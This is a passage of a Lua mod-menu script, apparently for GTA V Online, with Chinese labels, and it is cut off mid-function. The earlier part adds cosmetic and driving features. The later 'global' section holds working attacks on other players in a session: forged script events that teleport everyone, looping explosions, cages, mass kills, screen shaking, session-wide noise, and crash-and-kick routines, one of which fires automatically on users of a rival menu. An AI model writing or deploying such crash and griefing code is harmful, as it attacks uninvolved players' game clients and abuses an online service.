    ENTITY.SET_ENTITY_HEALTH(pilot, 10000)
    ENTITY.SET_ENTITY_INVINCIBLE(pilot, bodyguard_heli.ped_godmode)

    Relationship:friendly(pilot)
    table.insert(heli_ped_list, pilot)

    local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(heli_hash) - 2
    for seat = 0, seats do
        local ped = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        local pedNetId = NETWORK.PED_TO_NET(ped)
        if NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(ped) then
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(pedNetId, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(pedNetId, players.user(), true)
        end
        PED.SET_PED_INTO_VEHICLE(ped, heli, seat)
        --fight
        WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_mg"), -1, false, true)
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_SHOOT_RATE(ped, 1000)
        PED.SET_PED_ACCURACY(ped, 100)

        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_CENTER_ANGLE(ped, 90.0)

        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 0, true) --CanUseCover
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 1, true) --CanUseVehicles
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 2, true) --CanDoDrivebys
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 3, false) --CanLeaveVehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true) --AlwaysFight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 12, true) --BlindFireWhenInCover
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 13, true) --Aggressive
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true) --CanTauntInVehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 21, true) --CanChaseTargetOnFoot
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true) --PerfectAccuracy
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 41, true) --CanCommandeerVehicles
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true) --CanFightArmedPedsWhenNotArmed
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 55, true) --CanSeeUnderwaterPeds
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 58, true) --DisableFleeFromCombat

        PED.SET_PED_COMBAT_MOVEMENT(ped, 1) --Defensive
        PED.SET_PED_COMBAT_ABILITY(ped, 2) --Professional
        PED.SET_PED_COMBAT_RANGE(ped, 2) --Far
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1) --NeverLoseTarget

        PED.SET_COMBAT_FLOAT(ped, 10, 500.0)
        PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(ped, false)
        --health
        PED.SET_PED_MAX_HEALTH(ped, 1000)
        ENTITY.SET_ENTITY_HEALTH(ped, 1000)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, bodyguard_heli.ped_godmode)

        Relationship:friendly(ped)
        table.insert(heli_ped_list, ped)
    end

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(heli_hash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
end)

menu.divider(Bodyguard_Heli_options, "管理保镖直升机")
menu.toggle(Bodyguard_Heli_options, "所有保镖直升机无敌", {}, "", function(toggle)
    for k, ent in pairs(heli_ped_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            ENTITY.SET_ENTITY_INVINCIBLE(ent, toggle)
        end
    end
    for k, ent in pairs(heli_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            ENTITY.SET_ENTITY_INVINCIBLE(ent, toggle)
        end
    end
end)
menu.action(Bodyguard_Heli_options, "所有保镖直升机传送到我", {}, "", function()
    for k, ent in pairs(heli_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            TP_TO_ME(ent, math.random(-10, 10), math.random(-10, 10), 30)
        end
    end
end)
menu.action(Bodyguard_Heli_options, "删除所有保镖直升机", {}, "", function()
    for k, ent in pairs(heli_ped_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            entities.delete_by_handle(ent)
        end
    end
    for k, ent in pairs(heli_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            entities.delete_by_handle(ent)
        end
    end
    heli_list = {} --生成的直升机
    heli_ped_list = {} --直升机内的保镖
end)


    menu.toggle(interesting_features, "Homer模式", {""}, "", function(on)  

        if on then
    
        menu.trigger_commands("grace on")
    
        menu.trigger_commands("friction on")
    
        menu.trigger_commands("trails on")
    
        menu.trigger_commands("trailcolourrainbow 1")
    
        menu.trigger_commands("homerspeed on")
    
        menu.trigger_commands("homerjump on")

        menu.trigger_commands("homeraura on")
    
        menu.trigger_commands("FG on")
    
        menu.trigger_commands("wring on")
    
        menu.trigger_commands("bighammer on")
    
        else
    
        menu.trigger_commands("grace off")
    
        menu.trigger_commands("friction off")
    
        menu.trigger_commands("trails off")
    
        menu.trigger_commands("trailcolourrainbow 0")
    
        menu.trigger_commands("homerspeed off")
    
        menu.trigger_commands("homerjump off")

        menu.trigger_commands("homeraura off")
       
        menu.trigger_commands("FG off")
    
        menu.trigger_commands("wring off")
    
        menu.trigger_commands("bighammer off")
    
        end
    
    end)

    menu.toggle(interesting_features, "灵魂出窍", {""}, "", function(toggle)
        ghost = toggle 
        if ghost then
        all_peds = entities.get_all_peds_as_handles()
        user_ped = players.user_ped()
        clone = PED.CLONE_PED(user_ped,true, true, true)
        pos = ENTITY.GET_ENTITY_COORDS(clone, false)
		ENTITY.SET_ENTITY_COORDS(user_ped, pos.x-2, pos.y, pos.z)
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), 87, false)
        ENTITY.SET_ENTITY_INVINCIBLE(clone,true)
        menu.trigger_commands("invisibility remote")
        util.create_tick_handler(function()
        STREAMING.REQUEST_ANIM_DICT("move_crawl")
        PED.SET_PED_MOVEMENT_CLIPSET(clone, "move_crawl", -1)
        mod_uses("ped", if on then 1 else -1)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        return ghost
        end)
        else
            clonepedpos = ENTITY.GET_ENTITY_COORDS(clone, false)
            ENTITY.SET_ENTITY_COORDS(user_ped, clonepedpos.x,clonepedpos.y,clonepedpos.z, false, false)
            entities.delete_by_handle(clone)
            ENTITY.SET_ENTITY_ALPHA(user_ped, 255, false)
            menu.trigger_commands("invisibility off")
        end
    end)
    menu.toggle(interesting_features, "动物模式", {"spawnfurry"}, "", function(on)
        if on then
            menu.trigger_commands("IGFurry")
            menu.trigger_commands("walkstyle mop")
            notification("动物模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(interesting_features, "兔子模式", {"spawnrabbit"}, "注意:掏出枪瞄准时会引发崩溃(XA)", function(on)
        if on then
            menu.trigger_commands("ACRabbit02")
            menu.trigger_commands("walkstyle mop")
            notification("兔子模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(interesting_features, "圣诞怪兽模式", {"spawnyulemonster"}, "", function(on)
        if on then
            menu.trigger_commands("UMMYuleMonster")
            menu.trigger_commands("walkstyle mop")
            notification("圣诞怪兽模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle_loop(interesting_features, "萧敬腾模式", {""}, "", function()
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "water_boat_exit", player_pos.x, player_pos.y, player_pos.z+5, 0, 0, 0, 2.5, false, false, false)
    end)

    menu.toggle(interesting_features,"恶灵骑士" ,{""}, "", function(on)
        if on then 
            elqss()
            menu.trigger_commands("burningman on")
            menu.trigger_commands("footfire "..PLAYER.GET_PLAYER_NAME(players.user()).." on")
        else
            entities.delete_by_handle(vehicleelqs)
            menu.trigger_commands("burningman off")
            menu.trigger_commands("footfire "..PLAYER.GET_PLAYER_NAME(players.user()).." off")
        end

end)

    menu.toggle_loop(interesting_features,"抛掷载具", {"throwcars"}, "在载具附近按E将载具抬起来,在按E将载具投掷出去.", function(on)
        throwvehs()
    end)
    

    menu.toggle_loop(interesting_features,"抛掷NPC", {"throwpeds"}, "在NPC附近按E将NPC抬起来,在按E将NPC投掷出去.", function(on)
    throwpeds()
    end)




aircrafthud = menu.list(vehicle_options, "飞机HUD", {}, "", function();end)

feijihud = menu.action(aircrafthud,"加载flightredux",{"loadflightredux"},"",function()
    notification("正在加载飞机HUD请稍等")
    util.yield(1500)
    dofile(filesystem.scripts_dir() .."BeezyLib/flightredux.lua")
    menu.delete(feijihud)
end)



icluster = menu.list(vehicle_options, "车速表", {}, "", function();end)

unit = 1
menu.list_select(icluster, "单位", {"iclusterunits"}, "", {"MPH", "KPH"}, 1, function(index)
    unit = index 
end)

speedometer_x_pos = 0.700
menu.slider_float(icluster, "车速表位置X", {}, "", 0, 1000, 700, 1, function(s)
    speedometer_x_pos = s * 0.001
end)

speedometer_y_pos = 0.800
menu.slider_float(icluster, "车速表位置Y", {}, "", 0, 1000, 800, 1, function(s)
    speedometer_y_pos = s * 0.001
end)


tachometer_x_pos = 0.830
menu.slider_float(icluster, "转速表位置X", {}, "", 0, 1000, 830, 1, function(s)
    tachometer_x_pos = s * 0.001
end)

tachometer_y_pos = 0.818
menu.slider_float(icluster, "转速表位置Y", {}, "", 0, 1000, 818, 1, function(s)
    tachometer_y_pos = s * 0.001
end)

gear_x_pos = 0.764
menu.slider_float(icluster, "齿轮位置X", {}, "", 0, 1000, 764, 1, function(s)
    gear_x_pos = s * 0.001
end)

gear_y_pos = 0.870
menu.slider_float(icluster, "齿轮位置Y", {}, "", 0, 1000, 870, 1, function(s)
    gear_y_pos = s * 0.001
end)

lights_x_pos = 0.660
menu.slider_float(icluster, "仪器位置X", {}, "", 0, 1000, 660, 1, function(s)
    lights_x_pos = s * 0.001
end)

lights_y_pos = 0.920
menu.slider_float(icluster, "仪器位置Y", {}, "", 0, 1000, 920, 1, function(s)
    lights_y_pos = s * 0.001
end)

white = {
    r = 1,
    g = 1,
    b = 1,
    a = 1.0
}

orange = {
    r = 1.0,
    g = 0.5,
    b = 0,
    a = 1
}

blue = {
    r = 0, 
    g = 0, 
    b = 1, 
    a = 1
}

green = {
    r = 0, 
    g = 1, 
    b = 0, 
    a = 1
}
menu.toggle(icluster, "车速表显示", {"icluster"}, "", function(state)
    UItoggle = state
local lights, high_lights = memory.alloc_int(), memory.alloc_int()
while UItoggle do 
    vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if vehicle ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        local vecs = ENTITY.GET_ENTITY_SPEED_VECTOR(vehicle, true)
        local v_hdl = entities.handle_to_pointer(vehicle)
        local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
        local mph = speed * 2.236936
        local kph = speed * 3.6
        local max = VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(vehicle)
        local max_mph = max * 2.236936
        local max_kph = max * 3.6

        if unit == 1 then 
            measured_speed = mph 
            measured_max = max_mph
        else
            measured_speed = kph 
            measured_max = max_kph
        end
        local speed_rotation = (measured_speed/measured_max)*0.32
        if speed_rotation >= 0.75 then 
            speed_rotation = 0.75
        end
        local rpm = entities.get_rpm(v_hdl)
        if rpm == 1 then 
            -- rev limiter simulation
            rpm = rpm + math.random(-2, 2)*0.01
        end
        local tach_rotation = rpm*0.45
        directx.draw_texture(speedometer_case, 0.05, 0.05, 0.5, 0.5, speedometer_x_pos, speedometer_y_pos, 0, white)
        directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, speedometer_x_pos, speedometer_y_pos+0.015, speed_rotation, white)
        -- speed text also i guess what
        directx.draw_text(speedometer_x_pos, speedometer_y_pos+0.065, math.ceil(measured_speed), 5, 0.8, white, true)
        -- rpm gauge
        directx.draw_texture(tach_case, 0.05, 0.05, 0.5, 0.5, tachometer_x_pos, tachometer_y_pos-0.015, 0, white)
        -- rpm needle
        directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, tachometer_x_pos, tachometer_y_pos, tach_rotation, white)
        -- rpm text
        directx.draw_text(tachometer_x_pos, tachometer_y_pos+0.05, math.ceil(rpm*6000), 5, 0.8, white, true)
        -- gear text 
        gear = entities.get_current_gear(v_hdl)
        if gear == 0 and vecs.y < 0 then
            gear = "R"
        end
        if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(vehicle) < 1000 then
            directx.draw_texture(check_engine_light, 0.01, 0.01, 0.5, 0.5, lights_x_pos, lights_y_pos, 0, orange)
        end
        VEHICLE.GET_VEHICLE_LIGHTS_STATE(vehicle, lights, high_lights)
        if memory.read_byte(lights) == 1 then 
            if memory.read_byte(high_lights) == 1 then 
                directx.draw_texture(high_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.04, lights_y_pos, 0, blue)
            else
                directx.draw_texture(low_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.03, lights_y_pos, 0, green)
            end
        end
        any_tires_burst = false 
        for i = 1, 4 do 
            if VEHICLE.IS_VEHICLE_TYRE_BURST(vehicle, i, false) then 
                any_tires_burst = true 
            end
        end
        if any_tires_burst then 
            directx.draw_texture(tpms, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.08, lights_y_pos, 0, orange)
        end

        directx.draw_text(gear_x_pos, gear_y_pos, gear, 5, 1.2, white, true)
        if VEHICLE.IS_VEHICLE_IN_BURNOUT(vehicle) or math.abs(vecs.x) > 3 then 
            directx.draw_texture(traction_control, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.11, lights_y_pos, 0, orange)

        end
        
    end
    util.yield()
end
end)

drift_root = menu.list(vehicle_options, "飘移", {}, "", function();end)


menu.toggle_loop(drift_root, "绘制车辆角度", {"carangle"}, "绘制车辆相对于摄像机定位的角度。有助于了解你的漂移有多剧烈", function()
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        local ang = math.abs(math.ceil(math.abs(ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0).z) - math.abs(CAM.GET_GAMEPLAY_CAM_ROT(0).z)))
        directx.draw_text(0.5, 1.0, tostring(ang) .. '°', 5, 1.4, {r=1, g=1, b=1, a=1}, true)
    end
end)

menu.toggle_loop(drift_root, "按住shift键进行漂移", {"dshiftdrift"}, "你听到我说的了.", function(on)
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    end
end)

local shift_drift_toggle = false 
menu.toggle(drift_root, "开关换挡(shift)漂移", {"shiftdrifttoggle"}, "您应该将热键绑定到此开关，否则此功能将变得有点无用", function(on)
    shift_drift_toggle = on
    while true do
        if player_cur_car ~= 0 then 
            if not shift_drift_toggle then 
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
                break 
            end
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
            VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
        end
        util.yield()
    end
end)

menu.toggle(drift_root, "头文字D模式", {"initiald"}, "应用预定义的载具操纵配置,使您更容易漂移.这不会神奇地让你成为一名漂移高手,也不会神奇地使每辆车都擅长漂移.", function(on, click_type)
    initial_d_mode = on
    initial_d_score_thread()
    if player_cur_car ~= 0 then 
        if on then
            set_vehicle_into_drift_mode(player_cur_car)
        else
            for offset, value in pairs(last_vehicle_handling_data) do
                set_vehicle_handling_value(player_cur_car, offset, value)
            end
        end
    end
end)

menu.toggle(drift_root, "头文字D分数显示", {}, "", function(on, click_type)
    initial_d_score = on
end)


menu.toggle_loop(drift_root,  "相机方向推力", {"thrustindir"}, "按住X并保持此状态,将载具推向摄相机所面对的方向。用于维持漂移状态。", function(on)
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        if util.is_key_down("X") then 
            cam_direction()
        else 
            before_vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        end
    end
end)
menu.slider_float(drift_root, "相机方向推力的速度", {"thrustindiradd"}, "相机方向的推力需要增加多少额外速度", 0, 3000, 125, 1, function(s)
    thrust_cam_dir_add = s * -0.001
end)


menu.slider(vehicle_options, "换座位", {""}, "", -1, 6, -1, 1, function(value)

        local ourped = PLAYER.PLAYER_PED_ID()

    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then

        local veh = PED.GET_VEHICLE_PED_IS_IN(ourped, false)

        PED.SET_PED_INTO_VEHICLE(ourped, veh, value)

    else

        notification("傻B,你都没上车呢")

    end

end)



menu.toggle(vehicle_options, "智能自动驾驶", {"smartdrive"},"", function(on)

    smartAutodrive = on

    if not on then

        local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())

        TASK.CLEAR_PED_TASKS(my_ped)

    end

end, smartAutodrive)


local player_ped_id
local delta_time
local player_pos
util.create_tick_handler(function ()
    player_ped_id = PLAYER.PLAYER_PED_ID()
    delta_time = MISC.GET_FRAME_TIME()
    player_pos = ENTITY.GET_ENTITY_COORDS(player_ped_id)
    return true
end)


local math_funcs = b_math_funcs.new()
local shitty_gps_colour_a = {r = 255,g = 0,b = 255,a = 255}
local shitty_gps_colour_b = {r = 255,g = 255,b = 255,a = 255}
local shitty_gps_run = false
menu.toggle(vehicle_options, "GPS", {"GPS"}, "", function(value)

    local p_direction = memory.alloc(1) --bool
    local p_5 = memory.alloc(4) --float
    local p_distToNxJunction = memory.alloc(4) --float
    local p_screenX = memory.alloc(4) --float
    local p_screenY = memory.alloc(4) --float

    local turn_dir = 0
    shitty_gps_run = value

    if value then
    util.create_tick_handler(function ()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)

    local waypoint_pos = get_waypoint_coords()
    local total = waypoint_pos.x + waypoint_pos.y + waypoint_pos.z

    if total ~= 0 and ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
        local height = ENTITY.GET_ENTITY_HEIGHT(vehicle, player_pos.x, player_pos.y, player_pos.z, true, false)

        PATHFIND.GENERATE_DIRECTIONS_TO_COORD(
            waypoint_pos.x,
            waypoint_pos.y,
            waypoint_pos.z,
            0,
            p_direction,
            p_5,
            p_distToNxJunction
        )

        local direction = memory.read_byte(p_direction)
        local distToNxJunction = memory.read_float(p_distToNxJunction)



        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(
            player_pos.x,
            player_pos.y,
            player_pos.z + 1.5 + height,
            p_screenX,
            p_screenY
        )
        local screen_x = memory.read_float(p_screenX)
        local screen_y = memory.read_float(p_screenY)

       if direction == 1 then
            turn_dir = math_funcs.lerp(turn_dir, 180, 5 * delta_time)
            directx.draw_text(screen_x, screen_y, "可以的话请调头", ALIGN_CENTRE, 1, shitty_gps_colour_a)
        elseif direction == 3 then
            turn_dir =  math_funcs.lerp(turn_dir, -90, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"左转 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 6 then
            turn_dir =  math_funcs.lerp(turn_dir, -145, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"向左急转弯 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 4 then
            turn_dir =  math_funcs.lerp(turn_dir, 90, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"右转 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 7 then
            turn_dir =  math_funcs.lerp(turn_dir, 145, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"向右急转弯 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 8 then
            turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
            directx.draw_text(screen_x, screen_y, "正在计算新路线    ", ALIGN_CENTRE, 1, shitty_gps_colour_a)
        else
            turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
        end
        local direction = ENTITY.GET_ENTITY_FORWARD_VECTOR(player_ped_id)
        local angle = b_vectors.new().vector2.get_angle(direction, {x = 0, y = 1})
        if b_vectors.new().vector2.dot({x = direction.x, y = direction.y}, {x = 1, y = 0}) > 0 then
            angle = -angle
        end
        local draw_pos = b_common_funcs.new().get_pos_above_entity(vehicle)
        draw_pos.z = draw_pos.z + 0.4
        drawing_funcs.draw_arrow(draw_pos, angle - math.rad(turn_dir), 1, shitty_gps_colour_a, shitty_gps_colour_b)
    end

    return shitty_gps_run
    end)
    else
        memory.free(p_distToNxJunction)
        memory.free(p_direction)
        memory.free(p_5)
        memory.free(p_screenX)
        memory.free(p_screenY)
    end
end)

menu.action(global_options, "发送所有玩家海滩", {}, "", function () 

    for pid = 0, 32 do

        if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {330622597 ,2, 0, 0, 4, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)


menu.action(global_options, "发送所有玩家岛屿", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

                util.trigger_script_event(1 << pid, {-369672308, 0, 0, 0, 0, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

menu.action(global_options, "全局公寓邀请", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {3592101251, 1, 0, -1, 4, 127, 0, 0, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

menu.action(global_options, "全局随机任务邀请", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {36077543, 1, 7,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

menu.action(global_options, "全局传送仓库", {}, "", function () 
    for k,v in pairs(players.list(false, true, true)) do
		util.trigger_script_event(1 << v, {3592101251, 1, 0, -1, 4, 24, 0, 0, 0,PLAYER.GET_PLAYER_INDEX(), v})
	end
end)

menu.action(global_options, "全局传送DC", {}, "", function () 
    for k,v in pairs(players.list(false, true, true)) do
		util.trigger_script_event(1 << v, {1727896103, 0, 123, 0, 0, 1, -1001291848, -1016910157, 1108672448, 0, -1, 0, 2147483647, 0, -1,PLAYER.GET_PLAYER_INDEX(), v})
	end
end)

menu.click_slider(global_options, "全局送进任务", {}, "", 1, 8, 1, 1, function (on_change) 
    for k,v in pairs(players.list(false, true, true)) do
        if on_change == 1 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 0,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 2 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 1,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 3 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 2,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 4 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 3,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 5 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 4,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 6 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 5,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 7 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 6,PLAYER.GET_PLAYER_INDEX(), v})
        end
        if on_change == 8 then
		    util.trigger_script_event(1 << v, {-2138393348, 11, 7,PLAYER.GET_PLAYER_INDEX(), v})
        end
	end
end)

menu.toggle(global_options, "全自动移除XiPro玩家", {}, "", function (toggle) 
        chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
            if sender ~= players.user() and (string.find(text,"XiPro玩家") or string.find(text,"正在使用") or string.find(text,"正在尝试使用")) then
                menu.trigger_commands("crash" .. players.get_name(sender))
                util.yield(1000)
                menu.trigger_commands("kick" .. players.get_name(sender))
                util.yield(1000)
            end
        end)
end)



menu.toggle_loop(global_options, "全局随机循环", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local coords = ENTITY.GET_ENTITY_COORDS(target_ped)

            FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false,0.0)

        end

    end

end)

function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
menu.action(global_options, "战局雪天", {}, "本地可见", function () 
    --memory.script_global(262145+4752,0)
    SET_INT_GLOBAL(262145+4752,1)
end)

menu.action(global_options, "困住所有玩家", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))

				pos.z = pos.z + 0.95  

				local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))

				pos1.z = pos1.z - 0.90

				local cage = util.joaat("prop_feeder1_cr")

				STREAMING.REQUEST_MODEL(cage)

				OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos.x, pos.y ,pos.z , true, true)

				OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos1.x, pos1.y ,pos1.z , true, true)

        end

	end

end)

menu.toggle_loop(global_options, "震动屏幕", {}, "让每个人的屏幕震动", function()
    for k,v in pairs(players.list(false, true, true)) do
        shake_player(v, 5000)
        util.yield()
    end
    util.yield(1000)
end)

menu.action(global_options, "无声杀害", {"killeveryone"}, "无声地杀死所有人", function()
    for k,v in pairs(players.list(false, true, true)) do
        kill_player(v)
        util.yield()
    end
end)

local explosion_circle_angle = 0
menu.toggle_loop(global_options, "爆炸圈", {}, "", function ()
    for k,v in pairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
        explosion_circle(ped, explosion_circle_angle, 25)
    end

    explosion_circle_angle += 0.15
    util.yield(50)
end)

menu.action(global_options, "传送所有人的车辆到海洋", {""}, "", function()

allsqhy()

end)

    

menu.action(global_options, "传送所有人的车辆到花园银行", {""}, "", function()

allswre()

end)



menu.action(global_options, "防空警报", {"AirDefencesSound"}, "", function()

fangkongjingbao()

end)

    

menu.action(global_options, "噪音", {"bedsound"}, "在战局中播放大量的噪音", function()

zaoyin()

end)
local sound_location = filesystem.scripts_dir() .. "\\HeezyScript\\".."zhengyi.wav"
local zhengyipng = directx.create_texture(filesystem.scripts_dir() .. '/HeezyScript/' .. 'zhengyi.png')
local zhengyi = false
menu.action(global_options, "超级无敌宇宙崩", {}, "", function (on)
    zhengyi = on
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
    util.yield(9000)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(),players.user_ped(), 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
    zhengyi = off
end)

menu.action(global_options, "耶稣的救赎", {}, "", function ()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
    for i = 1, 20 do                   
        ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, util.joaat("prop_beach_parasol_05"))
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
        entities.delete_by_handle(SelfPlayerPed)
    end
end)

menu.action(global_options, "手动载具伞崩", {}, "", function ()
    notification("开始崩溃，请反复按空格键")
local spped = PLAYER.PLAYER_PED_ID()
local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
    local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
